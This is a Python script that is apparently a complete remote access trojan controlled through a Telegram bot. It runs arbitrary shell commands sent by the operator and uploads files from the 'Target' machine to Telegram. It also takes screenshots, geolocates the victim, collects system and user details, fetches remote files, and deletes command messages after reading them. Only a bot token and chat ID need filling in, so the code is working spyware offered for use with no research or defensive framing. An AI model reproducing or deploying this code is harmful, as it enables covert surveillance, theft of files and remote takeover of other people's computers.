import os
import platform
import requests
import subprocess
import time
from threading import Thread

try:
    from PIL import ImageGrab
except ImportError:
    import sys
    os.system(sys.executable + " -m pip install pillow -q -q -q")
    from PIL import ImageGrab

TOKEN = ''   # Change the token here
CHAT_ID = ''   # Change the chat id here

processed_message_ids = []

MAX_RETRIES = 3
RETRY_DELAY = 2  # seconds

def execute_command(command):
    if command == 'cd ..':
        os.chdir('..')
        return "Changed current directory to: " + os.getcwd()
    elif command == 'location':
        try:
            response = requests.get('https://ifconfig.me/ip')
            response.raise_for_status()
            public_ip = response.text.strip()

            url = f'http://ip-api.com/json/{public_ip}'
            response = requests.get(url)
            response.raise_for_status()
            data = response.json()
            country = data.get('country')
            region = data.get('region')
            city = data.get('city')
            lat = data.get('lat')
            lon = data.get('lon')
            timezone = data.get('timezone')
            isp = data.get('isp')

            final = f"Country: {country},\nRegion: {region},\nCity: {city},\nLatitude: {lat},\nLongitude: {lon},\nTimezone: {timezone},\nISP: {isp}"
            return final
        except Exception as e:
            return 'Error retrieving location'
    elif command == 'info':
        try:
            system_info = {
                'Platform': platform.platform(),
                'System': platform.system(),
                'Node Name': platform.node(),
                'Release': platform.release(),
                'Version': platform.version(),
                'Machine': platform.machine(),
                'Processor': platform.processor(),
                'CPU Cores': os.cpu_count(),
                'Username': os.getlogin(),
            }
            info_string = '\n'.join(f"{key}: {value}" for key, value in system_info.items())
            return info_string
        except Exception as e:
            return 'Error retrieving system info'
    elif command == 'screenshot':
        file_path = "screenshot.png"
        try:
            screenshot = ImageGrab.grab()
            screenshot.save(file_path)
            send_file(file_path)
            os.remove(file_path)
            return "Screenshot sent to Telegram."
        except Exception as e:
            return f"Error taking screenshot: {e}"
    elif command == 'help':
        return '''
        HELP MENU:
        CMD Commands        | Execute cmd commands directly in bot
        cd ..               | Change the current directory
        cd foldername       | Change to current folder
        download filename   | Download File From Target
        screenshot          | Capture Screenshot
        info                | Get System Info
        location            | Get Target Location
        get url             | Download File From URL (provide direct link)
            '''
    elif command.startswith('download '):
        filename = command[9:].strip()
        if os.path.isfile(filename):
            send_file(filename)
            return f"File '{filename}' sent to Telegram."
        else:
            return f"File '{filename}' not found."
    elif command.startswith('get '):
        url = command[4:].strip()
        try:
            download = requests.get(url)
            download.raise_for_status()
            if download.status_code == 200:
                file_name = url.split('/')[-1]
                with open(file_name, 'wb') as out_file:
                    out_file.write(download.content)
                return f"File downloaded and saved as '{file_name}'."
            else:
                return f"Failed to download file from URL: {url}. Status Code: {download.status_code}"
        except Exception as e:
            return f"Failed to download file from URL: {url}. Error: {str(e)}"
    elif command.startswith('cd '):
        foldername = command[3:].strip()
        try:
            os.chdir(foldername)
            return "Directory Changed To: " + os.getcwd()
        except FileNotFoundError:
            return f"Directory not found: {foldername}"
        except Exception as e:
            return f"Failed to change directory. Error: {str(e)}"
    else:
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return result.decode('utf-8').strip()
        except subprocess.CalledProcessError as e:
            return f"Command execution failed. Error: {e.output.decode('utf-8').strip()}"

def send_file(filename):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    with open(filename, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': CHAT_ID}
        retries = 0
        while retries < MAX_RETRIES:
            try:
                response = requests.post(url, data=data, files=files)
                response.raise_for_status()
                return
            except requests.exceptions.RequestException as e:
                print(f"Failed to send file: {e}")
                retries += 1
                if retries < MAX_RETRIES:
                    print(f"Retrying in {RETRY_DELAY} seconds...")
                    time.sleep(RETRY_DELAY)
        print("Max retries exceeded. File not sent.")

def handle_updates(updates):
    highest_update_id = 0
    for update in updates:
        if 'message' in update and 'text' in update['message']:
            message_text = update['message']['text']
            message_id = update['message']['message_id']
            if message_id in processed_message_ids:
                continue
            processed_message_ids.append(message_id)
            delete_message(message_id)
            result = execute_command(message_text)
            if result:
                send_message(result)
        update_id = update['update_id']
        if update_id > highest_update_id:
            highest_update_id = update_id
    return highest_update_id

def send_message(text):
    while not is_network_available():
        print("Waiting for network connection...")
        time.sleep(5)
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    params = {'chat_id': CHAT_ID, 'text': text}
    retries = 0
    while retries < MAX_RETRIES:
        try:
            response = requests.get(url, params=params)
            response.raise_for_status()
            return
        except requests.exceptions.RequestException as e:
            print(f"Failed to send message: {e}")
            retries += 1
            if retries < MAX_RETRIES:
                print(f"Retrying in {RETRY_DELAY} seconds...")
                time.sleep(RETRY_DELAY)
    print("Max retries exceeded. Message not sent.")

def is_network_available():
    try:
        response = requests.get('http://www.google.com', timeout=5)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False

def delete_message(message_id):
    url = f"https://api.telegram.org/bot{TOKEN}/deleteMessage"
    params = {'chat_id': CHAT_ID, 'message_id': message_id}
    try:
        response = requests.get(url, params=params)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"Failed to delete message: {e}")

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    params = {'offset': offset, 'timeout': 60}
    try:
        response = requests.get(url, params=params)
        response.raise_for_status()
        data = response.json()
        return data.get('result', [])
    except requests.exceptions.RequestException as e:
        print(f"Failed to get updates: {e}")
        return []

def main():
    send_message(f"{platform.node()} is running.")
    offset = None
    while True:
        updates = get_updates(offset)
        if updates:
            offset = handle_updates(updates) + 1
            processed_message_ids.clear()
        else:
            print("No updates found.")
        time.sleep(1)

if __name__ == '__main__':
    main()
